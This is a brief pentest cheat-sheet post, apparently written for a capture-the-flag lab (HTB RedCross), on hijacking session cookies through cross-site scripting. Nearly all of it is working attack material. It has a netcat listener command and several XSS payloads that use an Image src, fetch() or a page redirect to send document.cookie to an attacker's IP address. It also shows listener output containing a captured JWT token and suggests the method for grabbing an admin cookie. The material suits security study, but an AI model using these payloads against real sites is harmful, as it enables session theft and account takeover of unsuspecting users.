---
layout: post
title: Cookie/Session Hijacking
description: Cookie/Session Hijacking
summary: Cookie/Session Hijacking
tags: [web,xss]
minute: 1
---
## Intercepting via netcat
* Open netcat listener on attacker machine

```bash
nc -nlvp 4444
```

* Submit this XSS script on the form

```
<script>new Image().src="http://10.11.40.33:4444/bogus.php?output="+document.cookie;</script>
```

![](/spindel/assets/Cookie%20(Session)%20Hijacking/BC7E0478-D577-462B-BCF7-A9A0D0590D87.png)

* You will be able to intercept the cookie

```bash
➜  marketplace nc -nlvp 4444        
listening on [any] 4444 ...
connect to [10.11.40.33] from (UNKNOWN) [10.11.40.33] 57706
GET /bogus.php?output=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoiZGVtbyIsImFkbWluIjpmYWxzZSwiaWF0IjoxNjI4MTU5MzYzfQ.Nka6_SPBNEE1B3PmDWg4p7c3cG3BF4zqhTMCgGa6bJM HTTP/1.1
Host: 10.11.40.33:4444
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://10.10.177.20/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

* You can use this method to grab an admin cookie
* An alternative is using `fetch` and redirecting it to your HTTP listener

```bash
# using fetch
<script>fetch("http://10.11.40.33:4444/"+document.cookie)</script>
```

* NOTE: There mght be delay in seeing the output so you might want to be patient

## Redirect to another page
* Insert this payload to comment section

```bash
# 10.10.39.208 - victim ip
<script>document.location='http://10.10.39.208/log/'+document.cookie</script>
```

* Refresh the page
* Go to `/logs`

![](Cookie%20(Session)%20Hijacking/79797591-B0CB-47DA-A97A-26504675CB4D.png)

## Other payloads
```bash
# sent by server -> cookie: denied
cookie: granted
```

## References
* HTB RedCross
* [Cookies Hacking - HackTricks](https://book.hacktricks.xyz/pentesting-web/hacking-with-cookies)
